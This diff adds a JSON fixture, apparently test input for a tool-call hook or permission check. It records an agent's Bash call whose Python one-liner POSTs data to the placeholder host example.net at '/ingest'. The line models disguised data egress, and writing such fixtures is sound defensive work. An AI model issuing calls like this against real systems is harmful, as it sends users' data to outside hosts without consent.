@@ -1,0 +1,6 @@
+{
+  "tool_name": "Bash",
+  "tool_input": {
+    "command": "python3 -c \"import http.client; http.client.HTTPSConnection('example.net').request('POST','/ingest','x')\""
+  }
+}
